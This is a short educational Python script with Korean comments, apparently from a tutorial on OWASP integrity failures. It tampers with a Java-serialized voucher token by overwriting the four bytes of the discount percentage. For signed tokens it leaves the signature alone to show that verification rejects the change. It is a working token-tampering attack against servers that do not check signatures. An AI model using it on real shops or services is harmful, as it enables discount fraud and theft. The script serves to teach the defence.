#!/usr/bin/env python3
"""
[교육용] 역직렬화 무결성 실패(OWASP #8) 시연 — Voucher 토큰 바이트 패치.

discountPercent(int) 는 Java 직렬화 스트림에 "4바이트 빅엔디안"으로 고정 인코딩된다.
서버가 토큰의 무결성(서명)을 검증하지 않으면, 이 4바이트만 바꿔도 값이 바뀐 채
그대로 받아들여진다 — 그 사실을 보여주는 스크립트다. (ysoserial 같은 가젯체인/RCE 도구가
아니라, 역직렬화된 "필드 값"을 재검증 없이 신뢰할 때 생기는 무결성 실패를 보여준다.)

§4-3(서명 데모)의 voucherToken 은 "base64(직렬화바이트).base64(HMAC서명)" 형식이라, 점(.) 뒤의
서명까지 통째로 base64 디코딩하면 깨진다. 이 스크립트는 점이 있으면 앞부분(code)만 변조하고
뒷부분(서명)은 그대로 둔다 — 그래서 변조된 code 에 대해 서명이 더 이상 맞지 않게 되고,
apply-signed 는 역직렬화를 시도하기도 전에 서명 불일치로 거부한다.

사용법:
  python voucher_tamper.py <voucherToken> <원래discount> <새discount>

예:
  python voucher_tamper.py "rO0ABXNy..." 10 100                (§3-2, 서명 없는 토큰)
  python voucher_tamper.py "rO0ABXNy....<base64>.<sig>" 10 100  (§4-3, 서명 있는 토큰 — 서명은 그대로 둔 채 code 만 변조)
"""
import base64
import struct
import sys


def _tamper_bytes(token: str, old_percent: int, new_percent: int) -> str:
    data = bytearray(base64.b64decode(token))
    old_bytes = struct.pack(">i", old_percent)  # int 는 4바이트 빅엔디안으로 저장된다
    idx = data.find(old_bytes)
    if idx == -1:
        raise ValueError(f"원래 할인율({old_percent}%)에 해당하는 4바이트를 토큰에서 찾지 못했습니다")
    data[idx:idx + 4] = struct.pack(">i", new_percent)
    return base64.b64encode(bytes(data)).decode()


def tamper(token: str, old_percent: int, new_percent: int) -> str:
    if "." in token:
        # §4-3 서명 토큰 : code 부분만 변조하고, 서명은 (의도적으로) 그대로 둔다 -> 검증 시 불일치로 걸린다
        code_part, signature_part = token.split(".", 1)
        return _tamper_bytes(code_part, old_percent, new_percent) + "." + signature_part
    return _tamper_bytes(token, old_percent, new_percent)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("사용법: python voucher_tamper.py <voucherToken> <원래discount> <새discount>")
        sys.exit(1)
    token, old_percent, new_percent = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    print(tamper(token, old_percent, new_percent))
